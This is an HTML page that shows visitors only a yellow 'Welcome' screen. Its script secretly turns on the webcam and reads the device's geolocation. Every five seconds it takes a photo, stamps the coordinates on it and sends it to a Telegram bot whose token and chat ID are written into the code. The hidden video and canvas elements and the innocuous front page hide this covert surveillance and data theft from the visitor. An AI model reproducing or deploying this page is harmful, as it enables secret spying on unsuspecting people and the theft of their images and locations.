<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Camera Capture</title>
  <style>
    body {
      background-color: yellow; /* Yellow background */
      margin: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
    }

    /* Hide video and canvas */
    video, canvas {
      display: none;
    }

    /* Style the welcome text */
    .welcome-text {
      font-size: 3em;
      font-weight: bold;
      color: #333;
      text-align: center;
      animation: fadeIn 2s ease-in-out;
    }

    /* Add fade-in effect */
    @keyframes fadeIn {
      0% {
        opacity: 0;
        transform: translateY(50px);
      }
      100% {
        opacity: 1;
        transform: translateY(0);
      }
    }
  </style>
</head>
<body>
  <div class="welcome-text">Welcome</div>
  <video id="video" autoplay></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    // Start camera
    async function startCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        captureAndSend(); // Start capturing images and sending
      } catch (error) {
        console.error("Error accessing camera: ", error);
      }
    }

    // Get geolocation (latitude and longitude)
    function getLocation() {
      return new Promise((resolve, reject) => {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(resolve, reject);
        } else {
          reject("Geolocation is not supported by this browser.");
        }
      });
    }

    // Capture and send image every 5 seconds
    async function captureAndSend() {
      const context = canvas.getContext('2d');
      setInterval(async () => {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        // Get location data
        try {
          const position = await getLocation();
          const latitude = position.coords.latitude;
          const longitude = position.coords.longitude;

          // Add location text under the image
          context.font = "30px Arial";
          context.fillStyle = "white";
          context.fillText(`Location: ${latitude}, ${longitude}`, 10, canvas.height - 20);

          const imageData = canvas.toDataURL('image/png'); // Convert image to Base64
          sendToTelegram(imageData); // Send the image to Telegram
        } catch (error) {
          console.error("Error getting location: ", error);
        }
      }, 5000); // Send image every 5 seconds
    }

    // Send image to Telegram
    async function sendToTelegram(imageData) {
      const token = '8165540566:AAGXlo_1ljb6IkAG8jj7BjZdxwfJQhub96o'; // Bot token
      const chatId = '6514749116'; // Chat ID

      // Convert Base64 to file
      const blob = await fetch(imageData).then(res => res.blob());
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', blob, 'photo.png');

      // Send the image using Telegram API
      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
        method: 'POST',
        body: formData
      })
      .then(response => response.json())
      .then(result => {
        console.log('Photo sent successfully:', result);
      })
      .catch(error => {
        console.error('Error sending photo:', error);
      });
    }

    // Start camera when the page loads
    startCamera();
  </script>
</body>
</html>
